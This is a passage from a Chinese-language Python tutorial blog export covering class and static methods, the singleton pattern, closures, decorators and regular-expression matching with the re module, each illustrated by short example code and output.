具体对象的特征示例需求定义一个 工具类每件工具都有自己的 name需求 —— 知道使用这个类，创建了多少个工具对象？12345678910111213141516class Tool(object): # 使用赋值语句，定义类属性，记录创建工具对象的总数 count = 0 def __init__(self, name): self.name = name # 针对类属性做一个计数+1 Tool.count += 1# 创建工具对象tool1 = Tool("斧头")tool2 = Tool("榔头")tool3 = Tool("铁锹")# 知道使用 Tool 类到底创建了多少个对象?print("现在创建了 %d 个工具" % Tool.count)2.2 属性的获取机制（科普）在 Python 中 属性的获取 存在一个 向上查找机制因此，要访问类属性有两种方式：类名.类属性对象.类属性 （不推荐）注意如果使用 对象.类属性 = 值 赋值语句，只会 给对象添加一个属性，而不会影响到 类属性的值03. 类方法和静态方法3.1 类方法类属性 就是针对 类对象 定义的属性使用 赋值语句 在 class 关键字下方可以定义 类属性类属性 用于记录 与这个类相关 的特征类方法 就是针对 类对象 定义的方法在 类方法 内部可以直接访问 类属性 或者调用其他的 类方法语法如下123@classmethoddef 类方法名(cls): pass类方法需要用 修饰器 @classmethod 来标识，告诉解释器这是一个类方法类方法的 第一个参数 应该是 cls由 哪一个类 调用的方法，方法内的 cls 就是 哪一个类的引用这个参数和 实例方法 的第一个参数是 self 类似提示 使用其他名称也可以，不过习惯使用 cls通过 类名. 调用 类方法，调用方法时，不需要传递 cls 参数在方法内部可以通过 cls. 访问类的属性也可以通过 cls. 调用其他的类方法示例需求定义一个 工具类每件工具都有自己的 name需求 —— 在 类 封装一个 show_tool_count 的类方法，输出使用当前这个类，创建的对象个数1234@classmethoddef show_tool_count(cls): """显示工具对象的总数""" print("工具对象的总数 %d" % cls.count)在类方法内部，可以直接使用 cls 访问 类属性 或者 调用类方法3.2 静态方法在开发时，如果需要在 类 中封装一个方法，这个方法：既 不需要 访问 实例属性 或者调用 实例方法也 不需要 访问 类属性 或者调用 类方法这个时候，可以把这个方法封装成一个 静态方法语法如下：123@staticmethoddef 静态方法名(): pass静态方法 需要用 修饰器 @staticmethod 来标识，告诉解释器这是一个静态方法通过 类名. 调用 静态方法1234567891011class Dog(object): # 狗对象计数 dog_count = 0 @staticmethod def run(): # 不需要访问实例属性也不需要访问类属性的方法 print("狗在跑...") def __init__(self, name): self.name = name3.3 方法综合案例需求设计一个 Game 类属性：定义一个 类属性 top_score 记录游戏的 历史最高分定义一个 实例属性 player_name 记录 当前游戏的玩家姓名方法：静态方法 show_help 显示游戏帮助信息类方法 show_top_score 显示历史最高分实例方法 start_game 开始当前玩家的游戏主程序步骤1) 查看帮助信息2) 查看历史最高分3) 创建游戏对象，开始游戏案例小结实例方法 —— 方法内部需要访问 实例属性实例方法 内部可以使用 类名. 访问类属性类方法 —— 方法内部 只 需要访问 类属性静态方法 —— 方法内部，不需要访问 实例属性 和 类属性提问如果方法内部 即需要访问 实例属性，又需要访问 类属性，应该定义成什么方法？答案应该定义 实例方法因为，类只有一个，在 实例方法 内部可以使用 类名. 访问类属性123456789101112131415161718192021222324252627282930313233class Game(object): # 游戏最高分，类属性 top_score = 0 @staticmethod def show_help(): print("帮助信息：让僵尸走进房间") @classmethod def show_top_score(cls): print("游戏最高分是 %d" % cls.top_score) def __init__(self, player_name): self.player_name = player_name def start_game(self): print("[%s] 开始游戏..." % self.player_name) # 使用类名.修改历史最高分 Game.top_score = 999# 1. 查看游戏帮助Game.show_help()# 2. 查看游戏最高分Game.show_top_score()# 3. 创建游戏对象，开始游戏game = Game("小明")game.start_game()# 4. 游戏结束，查看游戏最高分Game.show_top_score()单例01. 单例设计模式设计模式设计模式 是 前人工作的总结和提炼，通常，被人们广泛流传的设计模式都是针对 某一特定问题 的成熟的解决方案使用 设计模式 是为了可重用代码、让代码更容易被他人理解、保证代码可靠性单例设计模式目的 —— 让 类 创建的对象，在系统中 只有 唯一的一个实例每一次执行 类名() 返回的对象，内存地址是相同的单例设计模式的应用场景音乐播放 对象回收站 对象打印机 对象……02. new 方法使用 类名() 创建对象时，Python 的解释器 首先 会 调用 new 方法为对象 分配空间__new__ 是一个 由 object 基类提供的 内置的静态方法，主要作用有两个：1) 在内存中为对象 分配空间2)返回 对象的引用Python 的解释器获得对象的 引用 后，将引用作为 第一个参数，传递给 init 方法重写 new 方法 的代码非常固定！重写 new 方法 一定要 return super().new(cls)否则 Python 的解释器 得不到 分配了空间的 对象引用，就不会调用对象的初始化方法注意：new 是一个静态方法，在调用时需要 主动传递 cls 参数示例代码:12345678910class MusicPlayer(object): def __new__(cls, *args, **kwargs): # 如果不返回任何结果， return super().__new__(cls) def __init__(self): print("初始化音乐播放对象")player = MusicPlayer()print(player)03. Python 中的单例单例 —— 让 类 创建的对象，在系统中 只有 唯一的一个实例定义一个 类属性，初始值是 None，用于记录 单例对象的引用重写 new 方法如果 类属性 is None，调用父类方法分配空间，并在类属性中记录结果返回 类属性 中记录的 对象引用1234567891011class MusicPlayer(object): # 定义类属性记录单例对象引用 instance = None def __new__(cls, *args, **kwargs): # 1. 判断类属性是否已经被赋值 if cls.instance is None: cls.instance = super().__new__(cls) # 2. 返回类属性的单例引用 return cls.instance3.1只执行一次初始化工作在每次使用 类名() 创建对象时，Python 的解释器都会自动调用两个方法：new 分配空间init 对象初始化在上一小节对 new 方法改造之后，每次都会得到 第一次被创建对象的引用但是：初始化方法还会被再次调用需求让 初始化动作 只被 执行一次解决办法定义一个类属性 init_flag 标记是否 执行过初始化动作，初始值为 False在 init 方法中，判断 init_flag，如果为 False 就执行初始化动作然后将 init_flag 设置为 True这样，再次 自动 调用 init 方法时，初始化动作就不会被再次执行 了12345678910111213141516171819202122232425262728class MusicPlayer(object): # 记录第一个被创建对象的引用 instance = None # 记录是否执行过初始化动作 init_flag = False def __new__(cls, *args, **kwargs): # 1. 判断类属性是否是空对象 if cls.instance is None: # 2. 调用父类的方法，为第一个对象分配空间 cls.instance = super().__new__(cls) # 3. 返回类属性保存的对象引用 return cls.instance def __init__(self): if not MusicPlayer.init_flag: print("初始化音乐播放器") MusicPlayer.init_flag = True# 创建多个对象player1 = MusicPlayer()print(player1)player2 = MusicPlayer()print(player2)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python_闭包和装饰器]]></title>
    <url>%2F2019%2F12%2F31%2Fpython_%E9%97%AD%E5%8C%85%E5%92%8C%E8%A3%85%E9%A5%B0%E5%99%A8%2F</url>
    <content type="text"><![CDATA[闭包1. 函数引用1234567891011121314def test1(): print("--- in test1 func----")# 调用函数test1()# 引用函数ret = test1print(id(ret))print(id(test1))#通过引用调用函数ret()运行结果:1234--- in test1 func----140212571149040140212571149040--- in test1 func----2. 什么是闭包12345678910111213141516171819# 定义一个函数def test(number): # 在函数内部再定义一个函数，并且这个函数用到了外边函数的变量，那么将这个函数以及用到的一些变量称之为闭包 def test_in(number_in): print("in test_in 函数, number_in is %d" % number_in) return number+number_in # 其实这里返回的就是闭包的结果 return test_in# 给test函数赋值，这个20就是给参数numberret = test(20)# 注意这里的100其实给参数number_inprint(ret(100))#注 意这里的200其实给参数number_inprint(ret(200))运行结果：12345in test_in 函数, number_in is 100120in test_in 函数, number_in is 2002203. 看一个闭包的实际例子：123456789def line_conf(a, b): def line(x): return a*x + b return lineline1 = line_conf(1, 1)line2 = line_conf(4, 5)print(line1(5))print(line2(5))这个例子中，函数line与变量a,b构成闭包。在创建闭包的时候，我们通过line_conf的参数a,b说明了这两个变量的取值，这样，我们就确定了函数的最终形式(y = x + 1和y = 4x + 5)。我们只需要变换参数a,b，就可以获得不同的直线表达函数。由此，我们可以看到，闭包也具有提高代码可复用性的作用。如果没有闭包，我们需要每次创建直线函数的时候同时说明a,b,x。这样，我们就需要更多的参数传递，也减少了代码的可移植性。注意点:由于闭包引用了外部函数的局部变量，则外部函数的局部变量没有及时释放，消耗内存4. 修改外部函数中的变量python3的方法1234567891011121314151617181920def counter(start=0): def incr(): nonlocal start start += 1 return start return incrc1 = counter(5)print(c1())print(c1())c2 = counter(50)print(c2())print(c2())print(c1())print(c1())print(c2())print(c2())python2的方法12345678910111213def counter(start=0): count=[start] def incr(): count[0] += 1 return count[0] return incrc1 = closeure.counter(5)print(c1()) # 6print(c1()) # 7c2 = closeure.counter(100)print(c2()) # 101print(c2()) # 102装饰器装饰器是程序开发中经常会用到的一个功能，用好了装饰器，开发效率如虎添翼，所以这也是Python面试中必问的问题，但对于好多初次接触这个知识的人来讲，这个功能有点绕，自学时直接绕过去了，然后面试问到了就挂了，因为装饰器是程序开发的基础知识，这个都不会，别跟人家说你会Python, 看了下面的文章，保证你学会装饰器。1、先明白这段代码1234567891011121314#### 第一波 ####def foo(): print('foo')foo # 表示是函数foo() # 表示执行foo函数#### 第二波 ####def foo(): print('foo')foo = lambda x: x + 1foo() # 执行lambda表达式，而不再是原来的foo函数，因为foo这个名字被重新指向了另外一个匿名函数函数名仅仅是个变量，只不过指向了定义的函数而已，所以才能通过 函数名()调用，如果 函数名=xxx被修改了，那么当在执行 函数名()时，调用的就不知之前的那个函数了2、需求来了初创公司有N个业务部门，基础平台部门负责提供底层的功能，如：数据库操作、redis调用、监控API等功能。业务部门使用基础功能时，只需调用基础平台提供的功能即可。如下：123456789101112131415161718192021222324252627############### 基础平台提供的功能如下 ###############def f1(): print('f1')def f2(): print('f2')def f3(): print('f3')def f4(): print('f4')############### 业务部门A 调用基础平台提供的功能 ###############f1()f2()f3()f4()############### 业务部门B 调用基础平台提供的功能 ###############f1()f2()f3()f4()目前公司有条不紊的进行着，但是，以前基础平台的开发人员在写代码时候没有关注验证相关的问题，即：基础平台的提供的功能可以被任何人使用。现在需要对基础平台的所有功能进行重构，为平台提供的所有功能添加验证机制，即：执行功能前，先进行验证。老大把工作交给 Low B，他是这么做的：跟每个业务部门交涉，每个业务部门自己写代码，调用基础平台的功能之前先验证。诶，这样一来基础平台就不需要做任何修改了。太棒了，有充足的时间泡妹子…当天Low B 被开除了…老大把工作交给 Low BB，他是这么做的：12345678910111213141516171819202122232425262728293031323334353637383940############### 基础平台提供的功能如下 ############### def f1(): # 验证1 # 验证2 # 验证3 print('f1')def f2(): # 验证1 # 验证2 # 验证3 print('f2')def f3(): # 验证1 # 验证2 # 验证3 print('f3')def f4(): # 验证1 # 验证2 # 验证3 print('f4')############### 业务部门不变 ############### ### 业务部门A 调用基础平台提供的功能### f1()f2()f3()f4()### 业务部门B 调用基础平台提供的功能 ### f1()f2()f3()f4()过了一周 Low BB 被开除了…老大把工作交给 Low BBB，他是这么做的：只对基础平台的代码进行重构，其他业务部门无需做任何修改1234567891011121314151617181920212223242526272829303132############### 基础平台提供的功能如下 ############### def check_login(): # 验证1 # 验证2 # 验证3 passdef f1(): check_login() print('f1')def f2(): check_login() print('f2')def f3(): check_login() print('f3')def f4(): check_login() print('f4')老大看了下Low BBB 的实现，嘴角漏出了一丝的欣慰的笑，语重心长的跟Low BBB聊了个天：老大说：写代码要遵循开放封闭原则，虽然在这个原则是用的面向对象开发，但是也适用于函数式编程，简单来说，它规定已经实现的功能代码不允许被修改，但可以被扩展，即：封闭：已实现的功能代码块开放：对扩展开发如果将开放封闭原则应用在上述需求中，那么就不允许在函数 f1 、f2、f3、f4的内部进行修改代码，老板就给了Low BBB一个实现方案：1234567891011121314151617181920def w1(func): def inner(): # 验证1 # 验证2 # 验证3 func() return inner@w1def f1(): print('f1')@w1def f2(): print('f2')@w1def f3(): print('f3')@w1def f4(): print('f4')对于上述代码，也是仅仅对基础平台的代码进行修改，就可以实现在其他人调用函数 f1 f2 f3 f4 之前都进行【验证】操作，并且其他业务部门无需做任何操作。Low BBB心惊胆战的问了下，这段代码的内部执行原理是什么呢？老大正要生气，突然Low BBB的手机掉到地上，恰巧屏保就是Low BBB的女友照片，老大一看一紧一抖，喜笑颜开，决定和Low BBB交个好朋友。详细的开始讲解了：单独以f1为例：1234567891011def w1(func): def inner(): # 验证1 # 验证2 # 验证3 func() return inner@w1def f1(): print('f1')python解释器就会从上到下解释代码，步骤如下：def w1(func): ==&gt;将w1函数加载到内存@w1没错， 从表面上看解释器仅仅会解释这两句代码，因为函数在 没有被调用之前其内部代码不会被执行。从表面上看解释器着实会执行这两句，但是 @w1 这一句代码里却有大文章， @函数名 是python的一种语法糖。上例@w1内部会执行一下操作：执行w1函数执行w1函数 ，并将 @w1 下面的函数作为w1函数的参数，即：@w1 等价于 w1(f1) 所以，内部就会去执行：1234567&gt; def inner(): &gt; #验证 1&gt; #验证 2&gt; #验证 3&gt; f1() # func是参数，此时 func 等于 f1 &gt; return inner# 返回的 inner，inner代表的是函数，非执行函数 ,其实就是将原来的 f1 函数塞进另外一个函数中&gt;w1的返回值将执行完的w1函数返回值 赋值 给@w1下面的函数的函数名f1 即将w1的返回值再重新赋值给 f1，即：1234567&gt; 新f1 = def inner(): &gt; #验证 1&gt; #验证 2&gt; #验证 3&gt; 原来f1()&gt; return inner&gt;所以，以后业务部门想要执行 f1 函数时，就会执行 新f1 函数，在新f1 函数内部先执行验证，再执行原来的f1函数，然后将原来f1 函数的返回值返回给了业务调用者。如此一来， 即执行了验证的功能，又执行了原来f1函数的内容，并将原f1函数返回值 返回给业务调用着Low BBB 你明白了吗？要是没明白的话，我晚上去你家帮你解决吧！！！3. 再议装饰器12345678910111213141516171819202122232425262728# 定义函数：完成包裹数据def makeBold(fn): def wrapped(): return "&lt;b&gt;" + fn() + "&lt;/b&gt;" return wrapped# 定义函数：完成包裹数据def makeItalic(fn): def wrapped(): return "&lt;i&gt;" + fn() + "&lt;/i&gt;" return wrapped@makeBolddef test1(): return "hello world-1"@makeItalicdef test2(): return "hello world-2"@makeBold@makeItalicdef test3(): return "hello world-3"print(test1())print(test2())print(test3())运行结果:123&lt;b&gt;hello world-1&lt;/b&gt;&lt;i&gt;hello world-2&lt;/i&gt;&lt;b&gt;&lt;i&gt;hello world-3&lt;/i&gt;&lt;/b&gt;4. 装饰器(decorator)功能引入日志函数执行时间统计执行函数前预备处理执行函数后清理功能权限校验等场景缓存5. 装饰器示例例1:无参数的函数123456789101112131415from time import ctime, sleepdef timefun(func): def wrapped_func(): print("%s called at %s" % (func.__name__, ctime())) func() return wrapped_func@timefundef foo(): print("I am foo")foo()sleep(2)foo()上面代码理解装饰器执行行为可理解成123456foo = timefun(foo)# foo先作为参数赋值给func后,foo接收指向timefun返回的wrapped_funcfoo()# 调用foo(),即等价调用wrapped_func()# 内部函数wrapped_func被引用，所以外部函数的func变量(自由变量)并没有释放# func里保存的是原foo函数对象例2:被装饰的函数有参数12345678910111213141516from time import ctime, sleepdef timefun(func): def wrapped_func(a, b): print("%s called at %s" % (func.__name__, ctime())) print(a, b) func(a, b) return wrapped_func@timefundef foo(a, b): print(a+b)foo(3,5)sleep(2)foo(2,4)例3:被装饰的函数有不定长参数123456789101112131415from time import ctime, sleepdef timefun(func): def wrapped_func(*args, **kwargs): print("%s called at %s"%(func.__name__, ctime())) func(*args, **kwargs) return wrapped_func@timefundef foo(a, b, c): print(a+b+c)foo(3,5,7)sleep(2)foo(2,4,9)例4:装饰器中的return12345678910111213141516171819202122from time import ctime, sleepdef timefun(func): def wrapped_func(): print("%s called at %s" % (func.__name__, ctime())) func() return wrapped_func@timefundef foo(): print("I am foo")@timefundef getInfo(): return '----hahah---'foo()sleep(2)foo()print(getInfo())执行结果:123456foo called at Fri Nov 4 21:55:35 2016I am foofoo called at Fri Nov 4 21:55:37 2016I am foogetInfo called at Fri Nov 4 21:55:37 2016None如果修改装饰器为return func()，则运行结果：123456foo called at Fri Nov 4 21:55:57 2016I am foofoo called at Fri Nov 4 21:55:59 2016I am foogetInfo called at Fri Nov 4 21:55:59 2016----hahah---总结：一般情况下为了让装饰器更通用，可以有return例5:装饰器带参数,在原有装饰器的基础上，设置外部变量1234567891011121314151617181920212223242526272829303132#decorator2.pyfrom time import ctime, sleepdef timefun_arg(pre="hello"): def timefun(func): def wrapped_func(): print("%s called at %s %s" % (func.__name__, ctime(), pre)) return func() return wrapped_func return timefun# 下面的装饰过程# 1. 调用timefun_arg("itcast")# 2. 将步骤1得到的返回值，即time_fun返回， 然后time_fun(foo)# 3. 将time_fun(foo)的结果返回，即wrapped_func# 4. 让foo = wrapped_fun，即foo现在指向wrapped_func@timefun_arg("itcast")def foo(): print("I am foo")@timefun_arg("python")def too(): print("I am too")foo()sleep(2)foo()too()sleep(2)too()可以理解为1foo()==timefun_arg(&quot;itcast&quot;)(foo)()例6：类装饰器（扩展，非重点）装饰器函数其实是这样一个接口约束，它必须接受一个callable对象作为参数，然后返回一个callable对象。在Python中一般callable对象都是函数，但也有例外。只要某个对象重写了 __call__() 方法，那么这个对象就是callable的。123456class Test(): def __call__(self): print('call me!')t = Test()t() # call me类装饰器demo123456789101112131415161718192021222324class Test(object): def __init__(self, func): print("---初始化---") print("func name is %s"%func.__name__) self.__func = func def __call__(self): print("---装饰器中的功能---") self.__func()#说明：#1. 当用Test来装作装饰器对test函数进行装饰的时候，首先会创建Test的实例对象# 并且会把test这个函数名当做参数传递到__init__方法中# 即在__init__方法中的属性__func指向了test指向的函数##2. test指向了用Test创建出来的实例对象##3. 当在使用test()进行调用时，就相当于让这个对象()，因此会调用这个对象的__call__方法##4. 为了能够在__call__方法中调用原来test指向的函数体，所以在__init__方法中就需要一个实例属性来保存这个函数体的引用# 所以才有了self.__func = func这句代码，从而在调用__call__方法中能够调用到test之前的函数体@Testdef test(): print("----test---")test()showpy()#如果把这句话注释，重新运行程序，依然会看到"--初始化--"运行结果如下：1234---初始化---func name is test---装饰器中的功能-------test---]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python_正则表达式]]></title>
    <url>%2F2019%2F12%2F31%2Fpython_%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[正则表达式re模块操作在Python中需要通过正则表达式对字符串进行匹配的时候，可以使用一个模块，名字为re1. re模块的使用过程12345678910#coding=utf-8# 导入re模块import re# 使用match方法进行匹配操作result = re.match(正则表达式,要匹配的字符串)# 如果上一步匹配到数据的话，可以使用group方法来提取数据result.group()2. re模块示例(匹配以itcast开头的语句)1234567#coding=utf-8import reresult = re.match("itcast","itcast.cn")result.group()运行结果为：1itcast3. 说明re.match() 能够匹配出以xxx开头的字符串匹配单个字符字符功能.匹配任意1个字符（除了\n）[ ]匹配[ ]中列举的字符\d匹配数字，即0-9\D匹配非数字，即不是数字\s匹配空白，即 空格，tab键\S匹配非空白\w匹配单词字符，即a-z、A-Z、0-9、_\W匹配非单词字符示例1： .123456789101112#coding=utf-8import reret = re.match(".","M")print(ret.group())ret = re.match("t.o","too")print(ret.group())ret = re.match("t.o","two")print(ret.group())运行结果为：123Mtootwo示例2：[ ]1234567891011121314151617181920212223242526272829303132333435#coding=utf-8import re# 如果hello的首字符小写，那么正则表达式需要小写的hret = re.match("h","hello Python") print(ret.group())# 如果hello的首字符大写，那么正则表达式需要大写的Hret = re.match("H","Hello Python") print(ret.group())# 大小写h都可以的情况ret = re.match("[hH]","hello Python")print(ret.group())ret = re.match("[hH]","Hello Python")print(ret.group())ret = re.match("[hH]ello Python","Hello Python")print(ret.group())# 匹配0到9第一种写法ret = re.match("[0123456789]Hello Python","7Hello Python")print(ret.group())# 匹配0到9第二种写法ret = re.match("[0-9]Hello Python","7Hello Python")print(ret.group())ret = re.match("[0-35-9]Hello Python","7Hello Python")print(ret.group())# 下面这个正则不能够匹配到数字4，因此ret为Noneret = re.match("[0-35-9]Hello Python","4Hello Python")# print(ret.group())运行结果为：12345678hHhHHello Python7Hello Python7Hello Python7Hello Python示例3：\d1234567891011121314151617181920212223#coding=utf-8import re# 普通的匹配方式ret = re.match("嫦娥1号","嫦娥1号发射成功") print(ret.group())ret = re.match("嫦娥2号","嫦娥2号发射成功") print(ret.group())ret = re.match("嫦娥3号","嫦娥3号发射成功") print(ret.group())# 使用\d进行匹配ret = re.match("嫦娥\d号","嫦娥1号发射成功") print(ret.group())ret = re.match("嫦娥\d号","嫦娥2号发射成功") print(ret.group())ret = re.match("嫦娥\d号","嫦娥3号发射成功") print(ret.group())运行结果为：123456嫦娥1号嫦娥2号嫦娥3号嫦娥1号嫦娥2号嫦娥3号n匹配多个字符字符功能*匹配前一个字符出现0次或者无限次，即可有可无+匹配前一个字符出现1次或者无限次，即至少有1次?匹配前一个字符出现1次或者0次，即要么有1次，要么没有{m}匹配前一个字符出现m次{m,n}匹配前一个字符出现从m到n次示例1：*需求：匹配出，一个字符串第一个字母为大小字符，后面都是小写字母并且这些小写字母可有可无1234567891011#coding=utf-8import reret = re.match("[A-Z][a-z]*","M")print(ret.group())ret = re.match("[A-Z][a-z]*","MnnM")print(ret.group())ret = re.match("[A-Z][a-z]*","Aabcdef")print(ret.group())运行结果：123MMnnAabcdef示例2：+需求：匹配出，变量名是否有效1234567891011#coding=utf-8import renames = ["name1", "_name", "2_name", "__name__"]for name in names: ret = re.match("[a-zA-Z_]+[\w]*",name) if ret: print("变量名 %s 符合要求" % ret.group()) else: print("变量名 %s 非法" % name)运行结果：1234变量名 name1 符合要求变量名 _name 符合要求变量名 2_name 非法变量名 __name__ 符合要求示例3：?需求：匹配出，0到99之间的数字1234567891011#coding=utf-8import reret = re.match("[1-9]?[0-9]","7")print(ret.group())ret = re.match("[1-9]?\d","33")print(ret.group())ret = re.match("[1-9]?\d","09")print(ret.group())运行结果：1237330 # 这个结果并不是想要的，利用$才能解决示例4：{m}需求：匹配出，8到20位的密码，可以是大小写英文字母、数字、下划线12345678#coding=utf-8import reret = re.match("[a-zA-Z0-9_]&#123;6&#125;","12a3g45678")print(ret.group())ret = re.match("[a-zA-Z0-9_]&#123;8,20&#125;","1ad12f23s34455ff66")print(ret.group())运行结果：1212a3g41ad12f23s34455ff66匹配开头结尾字符功能^匹配字符串开头$匹配字符串结尾示例1：$需求：匹配163.com的邮箱地址123456789101112#coding=utf-8import reemail_list = ["xiaoWang@163.com", "xiaoWang@163.comheihei", ".com.xiaowang@qq.com"]for email in email_list: ret = re.match("[\w]&#123;4,20&#125;@163\.com", email) if ret: print("%s 是符合规定的邮件地址,匹配后的结果是:%s" % (email, ret.group())) else: print("%s 不符合要求" % email)运行结果:123xiaoWang@163.com 是符合规定的邮件地址,匹配后的结果是:xiaoWang@163.comxiaoWang@163.comheihei 是符合规定的邮件地址,匹配后的结果是:xiaoWang@163.com.com.xiaowang@qq.com 不符合要求完善后12345678email_list = ["xiaoWang@163.com", "xiaoWang@163.comheihei", ".com.xiaowang@qq.com"]for email in email_list: ret = re.match("[\w]&#123;4,20&#125;@163\.com$", email) if ret: print("%s 是符合规定的邮件地址,匹配后的结果是:%s" % (email, ret.group())) else: print("%s 不符合要求" % email)运行结果：123xiaoWang@163.com 是符合规定的邮件地址,匹配后的结果是:xiaoWang@163.comxiaoWang@163.comheihei 不符合要求.com.xiaowang@qq.com 不符合要求匹配分组字符功能\匹配左右任意一个表达式(ab)将括号中字符作为一个分组\num引用分组num匹配到的字符串(?P&lt;name&gt;)分组起别名(?P=name)引用别名为name分组匹配到的字符串示例1：|需求：匹配出0-100之间的数字123456789101112131415161718192021222324252627282930313233#coding=utf-8import reret = re.match("[1-9]?\d","8")print(ret.group()) # 8ret = re.match("[1-9]?\d","78")print(ret.group()) # 78# 不正确的情况ret = re.match("[1-9]?\d","08")print(ret.group()) # 0# 修正之后的ret = re.match("[1-9]?\d$","08")if ret: print(ret.group())else: print("不在0-100之间")# 添加|ret = re.match("[1-9]?\d$|100","8")print(ret.group()) # 8ret = re.match("[1-9]?\d$|100","78")print(ret.group()) # 78ret = re.match("[1-9]?\d$|100","08")# print(ret.group()) # 不是0-100之间ret = re.match("[1-9]?\d$|100","100")print(ret.group()) # 100示例2：( )需求：匹配出163、126、qq邮箱123456789101112131415161718#coding=utf-8import reret = re.match("\w&#123;4,20&#125;@163\.com", "test@163.com")print(ret.group()) # test@163.comret = re.match("\w&#123;4,20&#125;@(163|126|qq)\.com", "test@126.com")print(ret.group()) # test@126.comret = re.match("\w&#123;4,20&#125;@(163|126|qq)\.com", "test@qq.com")print(ret.group()) # test@qq.comret = re.match("\w&#123;4,20&#125;@(163|126|qq)\.com", "test@gmail.com")if ret: print(ret.group())else: print("不是163、126、qq邮箱") # 不是163、126、qq邮箱不是以4、7结尾的手机号码(11位)12345678910import retels = ["13100001234", "18912344321", "10086", "18800007777"]for tel in tels: ret = re.match("1\d&#123;9&#125;[0-35-68-9]", tel) if ret: print(ret.group()) else: print("%s 不是想要的手机号" % tel)提取区号和电话号码1234567&gt;&gt;&gt; ret = re.match("([^-]*)-(\d+)","010-12345678")&gt;&gt;&gt; ret.group()'010-12345678'&gt;&gt;&gt; ret.group(1)'010'&gt;&gt;&gt; ret.group(2)'12345678'示例3：\需求：匹配出&lt;html&gt;hh&lt;/html&gt;12345678910111213141516171819202122232425#coding=utf-8import re# 能够完成对正确的字符串的匹配ret = re.match("&lt;[a-zA-Z]*&gt;\w*&lt;/[a-zA-Z]*&gt;", "&lt;html&gt;hh&lt;/html&gt;")print(ret.group())# 如果遇到非正常的html格式字符串，匹配出错ret = re.match("&lt;[a-zA-Z]*&gt;\w*&lt;/[a-zA-Z]*&gt;", "&lt;html&gt;hh&lt;/htmlbalabala&gt;")print(ret.group())# 正确的理解思路：如果在第一对&lt;&gt;中是什么，按理说在后面的那对&lt;&gt;中就应该是什么# 通过引用分组中匹配到的数据即可，但是要注意是元字符串，即类似 r""这种格式ret = re.match(r"&lt;([a-zA-Z]*)&gt;\w*&lt;/\1&gt;", "&lt;html&gt;hh&lt;/html&gt;")print(ret.group())# 因为2对&lt;&gt;中的数据不一致，所以没有匹配出来test_label = "&lt;html&gt;hh&lt;/htmlbalabala&gt;"ret = re.match(r"&lt;([a-zA-Z]*)&gt;\w*&lt;/\1&gt;", test_label)if ret: print(ret.group())else: print("%s 这是一对不正确的标签" % test_label)运行结果：1234&lt;html&gt;hh&lt;/html&gt;&lt;html&gt;hh&lt;/htmlbalabala&gt;&lt;html&gt;hh&lt;/html&gt;&lt;html&gt;hh&lt;/htmlbalabala&gt; 这是一对不正确的标签示例4：\number需求：匹配出&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;123456789101112#coding=utf-8import relabels = ["&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;", "&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h2&gt;&lt;/html&gt;"]for label in labels: ret = re.match(r"&lt;(\w*)&gt;&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1&gt;", label) if ret: print("%s 是符合要求的标签" % ret.group()) else: print("%s 不符合要求" % label)运行结果：12&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt; 是符合要求的标签&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h2&gt;&lt;/html&gt; 不符合要求示例5：(?P&lt;name&gt;) (?P=name)需求：匹配出&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;123456789#coding=utf-8import reret = re.match(r"&lt;(?P&lt;name1&gt;\w*)&gt;&lt;(?P&lt;name2&gt;\w*)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;", "&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;")ret.group()ret = re.match(r"&lt;(?P&lt;name1&gt;\w*)&gt;&lt;(?P&lt;name2&gt;\w*)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;", "&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h2&gt;&lt;/html&gt;")ret.group()注意：(?P&lt;name&gt;)和(?P=name)中的字母p大写re模块的高级用法search需求：匹配出文章阅读的次数12345#coding=utf-8import reret = re.search(r"\d+", "阅读次数为 9999")ret.group()运行结果：1'9999'findall需求：统计出python、c、c++相应文章阅读的次数12345#coding=utf-8import reret = re.findall(r"\d+", "python = 9999, c = 7890, c++ = 12345")print(ret)运行结果：1['9999', '7890', '12345']sub 将匹配到的数据进行替换需求：将匹配到的阅读次数加1方法1：12345#coding=utf-8import reret = re.sub(r"\d+", '998', "python = 997")print(ret)运行结果：1python = 998方法2：12345678910111213#coding=utf-8import redef add(temp): strNum = temp.group() num = int(strNum) + 1 return str(num)ret = re.sub(r"\d+", add, "python = 997")print(ret)ret = re.sub(r"\d+", add, "python = 99")print(ret)运行结果：12python = 998python = 100从下面的字符串中取出文本123456789101112131415161718&lt;div&gt; &lt;p&gt;岗位职责：&lt;/p&gt;&lt;p&gt;完成推荐算法、数据统计、接口、后台等服务器端相关工作&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;必备要求：&lt;/p&gt;&lt;p&gt;良好的自我驱动力和职业素养，工作积极主动、结果导向&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;/p&gt;&lt;p&gt;技术要求：&lt;/p&gt;&lt;p&gt;1、一年以上 Python 开发经验，掌握面向对象分析和设计，了解设计模式&lt;/p&gt;&lt;p&gt;2、掌握HTTP协议，熟悉MVC、MVVM等概念以及相关WEB开发框架&lt;/p&gt;&lt;p&gt;3、掌握关系数据库开发设计，掌握 SQL，熟练使用 MySQL/PostgreSQL 中的一种&lt;br&gt;&lt;/p&gt;&lt;p&gt;4、掌握NoSQL、MQ，熟练使用对应技术解决方案&lt;/p&gt;&lt;p&gt;5、熟悉 